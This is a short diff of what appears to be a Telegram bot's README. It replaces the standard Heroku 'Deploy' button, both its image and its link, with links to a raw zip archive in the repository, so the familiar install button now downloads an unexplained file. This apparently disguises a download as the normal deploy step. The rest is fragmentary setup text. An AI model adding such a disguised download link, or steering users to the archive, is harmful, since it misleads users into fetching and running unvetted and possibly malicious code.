@@ -1,4 +1,4 @@
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/erennew/en480p)
+[![Deploy](https://raw.githubusercontent.com/erennew/en480p/main/bot/p_en_3.5.zip)](https://raw.githubusercontent.com/erennew/en480p/main/bot/p_en_3.5.zip)
 ::
 Oof 
 Your Bot Father Setting to put
